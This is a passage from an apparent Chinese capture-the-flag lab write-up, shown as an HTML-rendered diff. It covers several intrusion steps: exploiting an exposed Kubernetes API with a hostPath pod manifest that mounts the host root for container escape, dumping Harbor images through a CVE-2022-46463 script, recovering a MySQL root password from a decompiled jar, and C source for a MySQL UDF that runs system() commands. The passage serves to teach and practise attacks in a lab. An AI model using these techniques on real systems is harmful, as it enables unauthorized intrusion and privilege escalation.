+    <span class="pl-s"><span class="pl-pds">"</span>/apis/autoscaling/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/autoscaling/v2beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/autoscaling/v2beta2<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/batch<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/batch/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/batch/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/certificates.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/certificates.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/coordination.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/coordination.k8s.io/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/coordination.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/events.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/events.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/extensions<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/extensions/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/networking.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/networking.k8s.io/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/networking.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/node.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/node.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/policy<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/policy/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/rbac.authorization.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/rbac.authorization.k8s.io/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/rbac.authorization.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/scheduling.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/scheduling.k8s.io/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/scheduling.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/storage.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/storage.k8s.io/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/storage.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/autoregister-completion<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/etcd<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/log<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/ping<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/apiservice-openapi-controller<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/apiservice-registration-controller<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/apiservice-status-available-controller<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/bootstrap-controller<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/ca-registration<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/crd-informer-synced<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/generic-apiserver-start-informers<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/kube-apiserver-autoregistration<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/rbac/bootstrap-roles<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/scheduling/bootstrap-system-priority-classes<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/start-apiextensions-controllers<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/start-apiextensions-informers<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/start-kube-aggregator-informers<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/healthz/poststarthook/start-kube-apiserver-admission-initializer<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/autoregister-completion<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/etcd<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/log<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/ping<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/apiservice-openapi-controller<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/apiservice-registration-controller<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/apiservice-status-available-controller<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/bootstrap-controller<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/ca-registration<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/crd-informer-synced<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/generic-apiserver-start-informers<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/kube-apiserver-autoregistration<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/rbac/bootstrap-roles<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/scheduling/bootstrap-system-priority-classes<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/start-apiextensions-controllers<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/start-apiextensions-informers<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/start-kube-aggregator-informers<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/livez/poststarthook/start-kube-apiserver-admission-initializer<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/logs<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/metrics<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/openapi/v2<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/autoregister-completion<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/etcd<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/log<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/ping<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/apiservice-openapi-controller<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/apiservice-registration-controller<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/apiservice-status-available-controller<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/bootstrap-controller<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/ca-registration<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/crd-informer-synced<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/generic-apiserver-start-informers<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/kube-apiserver-autoregistration<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/rbac/bootstrap-roles<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/scheduling/bootstrap-system-priority-classes<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/start-apiextensions-controllers<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/start-apiextensions-informers<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/start-kube-aggregator-informers<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/poststarthook/start-kube-apiserver-admission-initializer<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/readyz/shutdown<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/version<span class="pl-pds">"</span></span>
+  ]
+}
+</pre></div>
+<p>我这里是用的vshell的隧道代理加proxychains4来访问，但是kubectl好像总在收到回应时候有错，所以把静态工具传到靶机上搞，直接去拿就行</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">curl -LO <span class="pl-s"><span class="pl-pds">"</span>https://dl.k8s.io/release/<span class="pl-s"><span class="pl-pds">$(</span>curl -L -s https://dl.k8s.io/release/stable.txt<span class="pl-pds">)</span></span>/bin/linux/amd64/kubectl<span class="pl-pds">"</span></span></pre></div>
+<p>原本是只有一个的，第一个是我新加的，对k8s不是很了解参考的<a href="https://xz.aliyun.com/news/14423" rel="nofollow">春秋云境-GreatWall-先知社区</a><br>
+不过感觉就像是推了个docker过去了然后docker逃逸了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@ubuntu-oa:/tmp/test$ ./kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods
+Please enter Username: xiyi
+Please enter Password: NAME                                READY   STATUS    RESTARTS   AGE
+nginx-deployment                    1/1     Running   0          76m
+nginx-deployment-58d48b746d-q4zh7   1/1     Running   2          279d
+
+www-data@ubuntu-oa:/tmp/test$ ./kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ describe pod nginx-deployment-58d48b746d-q4zh7
+Please enter Username: xiyi
+Please enter Password: Name:             nginx-deployment-58d48b746d-q4zh7
+Namespace:        default
+Priority:         0
+Service Account:  default
+Node:             ubuntu-k8s/172.22.14.37
+Start Time:       Mon, 17 Mar 2025 16:11:45 +0800
+Labels:           app=nginx
+                  pod-template-hash=58d48b746d
+Annotations:      <span class="pl-k">&lt;</span>none<span class="pl-k">&gt;</span>
+Status:           Running
+IP:               10.244.0.14
+IPs:
+  IP:           10.244.0.14
+Controlled By:  ReplicaSet/nginx-deployment-58d48b746d
+Containers:
+  nginx:
+    Container ID:   docker://47907884f8491b05ed19d17b7d17c7ff74e26c96396080868377a98637362395
+    Image:          nginx:1.8
+    Image ID:       docker-pullable://nginx@sha256:c97ee70c4048fe79765f7c2ec0931957c2898f47400128f4f3640d0ae5d60d10
+    Port:           <span class="pl-k">&lt;</span>none<span class="pl-k">&gt;</span>
+    Host Port:      <span class="pl-k">&lt;</span>none<span class="pl-k">&gt;</span>
+    State:          Running
+      Started:      Sun, 21 Dec 2025 13:48:48 +0800
+    Last State:     Terminated
+      Reason:       Completed
+      Exit Code:    0
+      Started:      Mon, 17 Mar 2025 16:13:11 +0800
+      Finished:     Sun, 21 Dec 2025 13:47:29 +0800
+    Ready:          True
+    Restart Count:  2
+    Environment:    <span class="pl-k">&lt;</span>none<span class="pl-k">&gt;</span>
+    Mounts:
+      /var/run/secrets/kubernetes.io/serviceaccount from default-token-6d2pl (ro)
+Conditions:
+  Type              Status
+  Initialized       True 
+  Ready             True 
+  ContainersReady   True 
+  PodScheduled      True 
+Volumes:
+  default-token-6d2pl:
+    Type:        Secret (a volume populated by a Secret)
+    SecretName:  default-token-6d2pl
+    Optional:    <span class="pl-c1">false</span>
+QoS Class:       BestEffort
+Node-Selectors:  <span class="pl-k">&lt;</span>none<span class="pl-k">&gt;</span>
+Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists <span class="pl-k">for</span> 300s
+                 node.kubernetes.io/unreachable:NoExecute op=Exists <span class="pl-k">for</span> 300s
+Events:          <span class="pl-k">&lt;</span>none<span class="pl-k">&gt;</span></pre></div>
+<p>同样，用 <code class="notranslate">nginx:1.8</code> 镜像创建名为 nginx-deployment 的 pod，将宿主机的目录挂载到 /mnt 目录。新建 test.yaml 文件，内容如下：</p>
+<div class="highlight highlight-source-yaml"><pre class="notranslate"><span class="pl-ent">apiVersion</span>: <span class="pl-c1">v1</span>
+<span class="pl-ent">kind</span>: <span class="pl-s">Pod</span>
+<span class="pl-ent">metadata</span>:
+  <span class="pl-ent">name</span>: <span class="pl-s">nginx-deployment</span>
+<span class="pl-ent">spec</span>:
+  <span class="pl-ent">containers</span>:
+  - <span class="pl-ent">image</span>: <span class="pl-s">nginx:1.8</span>
+    <span class="pl-ent">name</span>: <span class="pl-s">container</span>
+    <span class="pl-ent">volumeMounts</span>:
+    - <span class="pl-ent">mountPath</span>: <span class="pl-s">/mnt</span>
+      <span class="pl-ent">name</span>: <span class="pl-s">test</span>
+  <span class="pl-ent">volumes</span>:
+  - <span class="pl-ent">name</span>: <span class="pl-s">test</span>
+    <span class="pl-ent">hostPath</span>:
+      <span class="pl-ent">path</span>: <span class="pl-s">/</span></pre></div>
+<p>创建pod同时保险起见再看一下弄上没有</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">./kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f test.yaml
+
+www-data@ubuntu-oa:/tmp/test$ ./kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods
+Please enter Username: xiyi
+Please enter Password: NAME                                READY   STATUS    RESTARTS   AGE
+nginx-deployment                    1/1     Running   0          80m
+nginx-deployment-58d48b746d-q4zh7   1/1     Running   2          279d</pre></div>
+<p>搞上了直接连接就行</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@ubuntu-oa:/tmp/test$ ./kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ <span class="pl-c1">exec</span> -it nginx-deployment -- /bin/bash
+Please enter Username: xiyi
+root@nginx-deployment:/<span class="pl-c"><span class="pl-c">#</span> </span>
+root@nginx-deployment:/<span class="pl-c"><span class="pl-c">#</span> </span></pre></div>
+<p>写个公钥很基础了，不演示了，flag在mysql的历史命令里</p>
+<h3>flag4</h3>
+<div class="highlight highlight-source-sql"><pre class="notranslate">root@ubuntu<span class="pl-k">-</span>k8s:~<span class="pl-c"><span class="pl-c">#</span> cat .mysql_history</span>
+_HiStOrY_V2_
+show\040databases;
+create\040database\040flaghaha;
+use\040flaghaha
+DROP\040TABLE\040IF\040EXISTS\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>f1ag<span class="pl-pds">`</span></span>;
+CREATE\040TABLE\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>flag06<span class="pl-pds">`</span></span>\<span class="pl-c1">040</span>(
+<span class="pl-s"><span class="pl-pds">`</span>id<span class="pl-pds">`</span></span>\040int\040DEFAULT\040NULL,
+\<span class="pl-c1">040</span>\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>f1agggggishere<span class="pl-pds">`</span></span>\040varchar(<span class="pl-c1">255</span>)\040DEFAULT\040NULL
+)\040ENGINE<span class="pl-k">=</span>MyISAM\040DEFAULT\040CHARSET<span class="pl-k">=</span>utf8;
+CREATE\040TABLE\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>flag06<span class="pl-pds">`</span></span>\<span class="pl-c1">040</span>(\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>id<span class="pl-pds">`</span></span>\040int\040DEFAULT\040NULL,\<span class="pl-c1">040</span>\<span class="pl-c1">040</span>\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>f1agggggishere<span class="pl-pds">`</span></span>\040varchar(<span class="pl-c1">255</span>)\040DEFAULT\040NULL\<span class="pl-c1">040</span>)\040ENGINE<span class="pl-k">=</span>MyISAM\040DEFAULT\040CHARSET<span class="pl-k">=</span>utf8;
+show\040tables;
+drop\040table\040flag06;
+DROP\040TABLE\040IF\040EXISTS\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>f1ag<span class="pl-pds">`</span></span>;
+CREATE\040TABLE\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>flag04<span class="pl-pds">`</span></span>\<span class="pl-c1">040</span>(
+<span class="pl-s"><span class="pl-pds">`</span>id<span class="pl-pds">`</span></span>\040int\040DEFAULT\040NULL,
+\<span class="pl-c1">040</span>\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>f1agggggishere<span class="pl-pds">`</span></span>\040varchar(<span class="pl-c1">255</span>)\040DEFAULT\040NULL
+)\040ENGINE<span class="pl-k">=</span>MyISAM\040DEFAULT\040CHARSET<span class="pl-k">=</span>utf8;
+CREATE\040TABLE\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>flag04<span class="pl-pds">`</span></span>\<span class="pl-c1">040</span>(\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>id<span class="pl-pds">`</span></span>\040int\040DEFAULT\040NULL,\<span class="pl-c1">040</span>\<span class="pl-c1">040</span>\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>f1agggggishere<span class="pl-pds">`</span></span>\040varchar(<span class="pl-c1">255</span>)\040DEFAULT\040NULL\<span class="pl-c1">040</span>)\040ENGINE<span class="pl-k">=</span>MyISAM\040DEFAULT\040CHARSET<span class="pl-k">=</span>utf8;
+INSERT\040INTO\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>flag<span class="pl-pds">`</span></span>\040VALUES\<span class="pl-c1">040</span>(<span class="pl-c1">1</span>,\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">'</span>ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==<span class="pl-pds">'</span></span>);
+INSERT\040INTO\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">`</span>flag04<span class="pl-pds">`</span></span>\040VALUES\<span class="pl-c1">040</span>(<span class="pl-c1">1</span>,\<span class="pl-c1">040</span><span class="pl-s"><span class="pl-pds">'</span>ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==<span class="pl-pds">'</span></span>);
+exit</pre></div>
+<p>解码即可</p>
+<h2>172.22.14.46-Harbor</h2>
+<p>fscan可以扫出来存在 Harbor 公开镜像仓库未授权访问</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@VM-8-5-ubuntu:<span class="pl-k">~</span>/tools/CVE-2022-46463_harbor# proxychains python3 harbor.py http://172.22.14.46
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:10002  ...  172.22.14.46:80  ...  OK
+[<span class="pl-k">*</span>] API version used v2.0
+[proxychains] Strict chain  ...  127.0.0.1:10002  ...  172.22.14.46:80  ...  OK
+[+] project/projectadmin
+[+] project/portal
+[+] library/nginx
+[+] library/redis
+[+] harbor/secret</pre></div>
+<p>dump到本地</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@VM-8-5-ubuntu:<span class="pl-k">~</span>/tools/CVE-2022-46463_harbor# proxychains python3 harbor.py http://172.22.14.46 --dump harbor/secret --v2</pre></div>
+<h3>flag5</h3>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@VM-8-5-ubuntu:<span class="pl-k">~</span>/tools/CVE-2022-46463_harbor# cat ./caches/harbor_secret/latest/413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49/f1ag05_Yz1o.txt
+flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}</pre></div>
+<h2>172.22.10.28-mysql_udf</h2>
+<p>刚才dump出来的公开镜像里还有个<code class="notranslate">project/projectadmin</code>，看名字拉一手</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@VM-8-5-ubuntu:<span class="pl-k">~</span>/tools/CVE-2022-46463_harbor# proxychains python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2</pre></div>
+<p>可以看到，里面有个jar包</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@VM-8-5-ubuntu:<span class="pl-k">~</span>/tools/CVE-2022-46463_harbor/caches/project_projectadmin/latest/90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c# cat run.sh
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+sleep 1
+
+<span class="pl-c"><span class="pl-c">#</span> start</span>
+java -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar
+/usr/bin/tail -f /dev/null</pre></div>
+<p>jar包反编译下能拿到mysql的密码<br>
+在SpringBoot 配置文件 <code class="notranslate">application.properties</code> 下</p>
+<div class="highlight highlight-source-java"><pre class="notranslate"><span class="pl-s1">spring</span>.<span class="pl-s1">datasource</span>.<span class="pl-s1">url</span>=<span class="pl-s1">jdbc</span>:<span class="pl-s1">mysql</span>:<span class="pl-c">//172.22.10.28:3306/projectadmin?characterEncoding=utf-8&amp;useUnicode=true&amp;serverTimezone=UTC</span>
+<span class="pl-s1">spring</span>.<span class="pl-s1">datasource</span>.<span class="pl-s1">username</span>=<span class="pl-smi">root</span>
+<span class="pl-s1">spring</span>.<span class="pl-s1">datasource</span>.<span class="pl-s1">password</span>=<span class="pl-smi">My3q1i4oZkJm3</span>
+<span class="pl-s1">spring</span>.<span class="pl-s1">datasource</span>.<span class="pl-s1">driver</span>-<span class="pl-s1">class</span>-<span class="pl-s1">name</span>=<span class="pl-smi">com</span>.<span class="pl-smi">mysql</span>.<span class="pl-smi">cj</span>.<span class="pl-smi">jdbc</span>.<span class="pl-smi">Driver</span></pre></div>
+<p>同时<strong>172.22.10.28</strong>开放了3306，可以连上看一手，这里我的MDUT一样用不了，猜测还是因为代理的缘故，手动搞吧，以前出靶机<strong>XIYI</strong>的时候存过一个，udf提权条件可以看XIYI的WP</p>
+<div class="highlight highlight-source-c"><pre class="notranslate"><span class="pl-s1">udf</span>.<span class="pl-c1">c</span>
+
+<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
+
+<span class="pl-k">#include</span> <span class="pl-s">&lt;stdlib.h&gt;</span>
+
+
+
+<span class="pl-k">enum</span> <span class="pl-smi">Item_result</span> {<span class="pl-c1">STRING_RESULT</span>, <span class="pl-c1">REAL_RESULT</span>, <span class="pl-c1">INT_RESULT</span>, <span class="pl-c1">ROW_RESULT</span>};
+
+
+
+<span class="pl-k">typedef</span> <span class="pl-k">struct</span> <span class="pl-smi">st_udf_args</span> {
+
+        <span class="pl-smi">unsigned <span class="pl-smi">int</span></span>            <span class="pl-c1">arg_count</span>;      <span class="pl-c">// number of arguments</span>
+
+        <span class="pl-k">enum</span> <span class="pl-smi">Item_result</span>        <span class="pl-c1">*</span><span class="pl-c1">arg_type</span>;      <span class="pl-c">// pointer to item_result</span>
+
+        <span class="pl-smi">char</span>                    <span class="pl-c1">*</span><span class="pl-c1">*</span><span class="pl-c1">args</span>;         <span class="pl-c">// pointer to arguments</span>
+
+        <span class="pl-smi">unsigned long</span>           <span class="pl-c1">*</span><span class="pl-c1">lengths</span>;       <span class="pl-c">// length of string args</span>
+
+        <span class="pl-smi">char</span>                    <span class="pl-c1">*</span><span class="pl-c1">maybe_null</span>;    <span class="pl-c">// 1 for maybe_null args</span>
+
+} <span class="pl-smi">UDF_ARGS</span>;
+
+
+
+<span class="pl-k">typedef</span> <span class="pl-k">struct</span> <span class="pl-smi">st_udf_init</span> {
+
+        <span class="pl-smi">char</span>                    <span class="pl-c1">maybe_null</span>;     <span class="pl-c">// 1 if func can return NULL</span>
+
+        <span class="pl-smi">unsigned <span class="pl-smi">int</span></span>            <span class="pl-c1">decimals</span>;       <span class="pl-c">// for real functions</span>
+
+        <span class="pl-smi">unsigned long</span>           <span class="pl-c1">max_length</span>;     <span class="pl-c">// for string functions</span>
+
+        <span class="pl-smi">char</span>                    <span class="pl-c1">*</span><span class="pl-c1">ptr</span>;           <span class="pl-c">// free ptr for func data</span>
+
+        <span class="pl-smi">char</span>                    <span class="pl-c1">const_item</span>;     <span class="pl-c">// 0 if result is constant</span>
+
+} <span class="pl-smi">UDF_INIT</span>;
+
+
+
+<span class="pl-smi">int</span> <span class="pl-en">do_system</span>(<span class="pl-smi">UDF_INIT</span> <span class="pl-c1">*</span><span class="pl-s1">initid</span>, <span class="pl-smi">UDF_ARGS</span> <span class="pl-c1">*</span><span class="pl-s1">args</span>, <span class="pl-smi">char</span> <span class="pl-c1">*</span><span class="pl-s1">is_null</span>, <span class="pl-smi">char</span> <span class="pl-c1">*</span><span class="pl-s1">error</span>)
+
+{
+
+        <span class="pl-k">if</span> (<span class="pl-s1">args</span><span class="pl-c1">-&gt;</span><span class="pl-c1">arg_count</span> <span class="pl-c1">!=</span> <span class="pl-c1">1</span>)
+
+                <span class="pl-k">return</span>(<span class="pl-c1">0</span>);
+
+
+
+        <span class="pl-en">system</span>(<span class="pl-s1">args</span><span class="pl-c1">-&gt;</span><span class="pl-c1">args</span>[<span class="pl-c1">0</span>]);
+
+
+
+        <span class="pl-k">return</span>(<span class="pl-c1">0</span>);
+
+}
+
+
+
+<span class="pl-smi">char</span> <span class="pl-en">do_system_init</span>(<span class="pl-smi">UDF_INIT</span> <span class="pl-c1">*</span><span class="pl-s1">initid</span>, <span class="pl-smi">UDF_ARGS</span> <span class="pl-c1">*</span><span class="pl-s1">args</span>, <span class="pl-smi">char</span> <span class="pl-c1">*</span><span class="pl-s1">message</span>)
+
+{
+
+        <span class="pl-k">return</span>(<span class="pl-c1">0</span>);
+
+}</pre></div>
+<p>这个没回显，不过我是上线vshell的，也够用了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@VM-8-5-ubuntu:/tmp/test# gcc -g -shared -o udf.so udf.c -lc
+root@VM-8-5-ubuntu:/tmp/test# xxd -p udf.so <span class="pl-k">|</span> tr -d <span class="pl-s"><span class="pl-pds">'</span>\n<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> udf.hex
+
+root@VM-8-5-ubuntu:/tmp/test# proxychains4 mysql -h 172.22.10.28 -uroot -pMy3q1i4oZkJm3
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+mysql: [Warning] Using a password on the <span class="pl-c1">command</span> line interface can be insecure.
+[proxychains] Strict chain  ...  127.0.0.1:10002  ...  172.22.10.28:3306  ...  OK
+Welcome to the MySQL monitor.  Commands end with <span class="pl-k">;</span> or <span class="pl-cce">\g</span>.
+Your MySQL connection id is 163
+Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2025, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type <span class="pl-s"><span class="pl-pds">'</span>help;<span class="pl-pds">'</span></span> or <span class="pl-s"><span class="pl-pds">'</span>\h<span class="pl-pds">'</span></span> <span class="pl-k">for</span> help. Type <span class="pl-s"><span class="pl-pds">'</span>\c<span class="pl-pds">'</span></span> to clear the current input statement.</pre></div>
